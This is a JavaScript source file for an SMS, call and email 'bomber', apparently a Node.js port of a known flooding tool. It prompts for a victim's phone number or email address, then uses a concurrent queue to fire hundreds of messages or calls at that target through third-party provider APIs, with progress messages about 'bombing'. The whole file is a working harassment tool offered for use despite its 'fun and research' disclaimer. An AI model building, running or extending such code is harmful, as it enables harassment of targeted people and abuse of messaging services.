const APIProvider = require('./APIProvider');
const Utils = require('./Utils');
const PQueue = require('pqueue').default;

class Bomber {
  constructor(mesgdcrt) {
    this.mesgdcrt = mesgdcrt;
    this.maxLimits = {
      sms: 500,
      call: 15,
      mail: 200
    };
  }

  async getPhoneInfo(countryCodes) {
    const prompt = require('prompt-sync')();
    
    while (true) {
      const cc = Utils.formatPhone(
        prompt(this.mesgdcrt.CommandMessage('Enter your country code (Without +): '))
      );
      
      if (!countryCodes[cc]) {
        this.mesgdcrt.WarningMessage(
          `The country code (${cc}) that you have entered is invalid or unsupported`
        );
        continue;
      }
      
      const target = Utils.formatPhone(
        prompt(this.mesgdcrt.CommandMessage(`Enter the target number: +${cc} `))
      );
      
      if (target.length <= 6 || target.length >= 12) {
        this.mesgdcrt.WarningMessage(
          `The phone number (${target}) that you have entered is invalid`
        );
        continue;
      }
      
      return { cc, target };
    }
  }

  async getMailInfo() {
    const prompt = require('prompt-sync')();
    
    while (true) {
      const target = prompt(
        this.mesgdcrt.CommandMessage('Enter target mail: ')
      );
      
      if (!Utils.isValidEmail(target)) {
        this.mesgdcrt.WarningMessage(
          `The mail (${target}) that you have entered is invalid`
        );
        continue;
      }
      
      return target;
    }
  }

  async selectNode(mode, countryCodes) {
    mode = mode.toLowerCase().trim();
    
    try {
      Utils.clearScreen();
      const version = Utils.getVersion();
      const contributors = ['SpeedX', 't0xic0der', 'scpketer', 'Stefan', 'shakil1095 (NodeJS Port)'];
      Utils.printBanner(version, contributors, this.mesgdcrt);
      
      // Check internet
      this.mesgdcrt.SectionMessage('Checking internet connection...');
      const hasInternet = await Utils.checkInternetConnection();
      if (!hasInternet) {
        this.mesgdcrt.FailureMessage('Poor internet connection detected');
        process.exit(2);
      }
      this.mesgdcrt.SuccessMessage('Internet connection OK');
      
      let cc = '', target = '';
      let limit = this.maxLimits[mode];
      
      if (['sms', 'call'].includes(mode)) {
        const phoneInfo = await this.getPhoneInfo(countryCodes);
        cc = phoneInfo.cc;
        target = phoneInfo.target;
        
        // Reduce limit for non-India SMS
        if (cc !== '91' && mode === 'sms') {
          limit = 100;
        }
      } else if (mode === 'mail') {
        target = await this.getMailInfo();
      } else {
        throw new Error('Invalid mode');
      }
      
      // Get count, delay, and threads
      const prompt = require('prompt-sync')();
      const countInput = parseInt(
        prompt(this.mesgdcrt.CommandMessage(
          `Enter number of ${mode.toUpperCase()} to send (Max ${limit}): `
        ))
      );
      
      let count = countInput;
      if (count > limit || count === 0) {
        this.mesgdcrt.WarningMessage(`You have requested ${count} ${mode.toUpperCase()}`);
        this.mesgdcrt.GeneralMessage(`Automatically capping the value to ${limit}`);
        count = limit;
      }
      
      const delay = parseFloat(
        prompt(this.mesgdcrt.CommandMessage('Enter delay time (in seconds): '))
      );
      
      const maxThreadLimit = Math.max(Math.floor(count / 10), 1);
      const threadsInput = parseInt(
        prompt(this.mesgdcrt.CommandMessage(
          `Enter Number of Thread (Recommended: ${maxThreadLimit}): `
        ))
      );
      
      const maxThreads = threadsInput > 0 ? threadsInput : maxThreadLimit;
      
      if (count < 0 || delay < 0) {
        throw new Error('Invalid input');
      }
      
      await this.workerNode(mode, cc, target, count, delay, maxThreads);
    } catch (err) {
      if (err.message.includes('User input cancelled')) {
        this.mesgdcrt.WarningMessage('Received interrupt - Exiting...');
      } else {
        this.mesgdcrt.FailureMessage('Read Instructions Carefully !!!');
      }
      process.exit(1);
    }
  }

  async workerNode(mode, cc, target, count, delay, maxThreads) {
    const api = new APIProvider(cc, target, mode, delay);
    
    Utils.clearScreen();
    this.mesgdcrt.SectionMessage('Gearing up the Bomber - Please be patient');
    this.mesgdcrt.GeneralMessage('Please stay connected to the internet during bombing');
    this.mesgdcrt.GeneralMessage(`API Version   : ${api.getApiVersion()}`);
    this.mesgdcrt.GeneralMessage(`Target        : +${cc}${target}`);
    this.mesgdcrt.GeneralMessage(`Amount        : ${count}`);
    this.mesgdcrt.GeneralMessage(`Threads       : ${maxThreads} threads`);
    this.mesgdcrt.GeneralMessage(`Delay         : ${delay} seconds`);
    this.mesgdcrt.WarningMessage('This tool was made for fun and research purposes only');
    
    const prompt = require('prompt-sync')();
    prompt(this.mesgdcrt.CommandMessage('Press [ENTER] to start bombing...'));
    
    if (api.getAvailableProviders() === 0) {
      this.mesgdcrt.FailureMessage('Your country/target is not supported yet');
      this.mesgdcrt.GeneralMessage('Feel free to reach out to us');
      prompt(this.mesgdcrt.CommandMessage('Press [ENTER] to exit'));
      process.exit(1);
    }
    
    // Create queue with concurrency limit
    const queue = new PQueue({ concurrency: maxThreads });
    
    let success = 0;
    let failed = 0;
    
    // Add all tasks to queue
    const tasks = [];
    for (let i = 0; i < count; i++) {
      tasks.push(
        queue.add(async () => {
          const result = await api.hit();
          if (result === null) {
            this.mesgdcrt.FailureMessage(
              'Bombing limit for your target has been reached'
            );
            this.mesgdcrt.GeneralMessage('Try Again Later !!');
            process.exit(1);
          }
          if (result) {
            success++;
          } else {
            failed++;
          }
          Utils.prettyPrint(cc, target, success, failed, this.mesgdcrt);
        })
      );
    }
    
    // Wait for all tasks to complete
    await Promise.all(tasks);
    
    console.log();
    this.mesgdcrt.SuccessMessage('Bombing completed!');
    await Utils.sleep(1500);
    process.exit(0);
  }
}

module.exports = Bomber;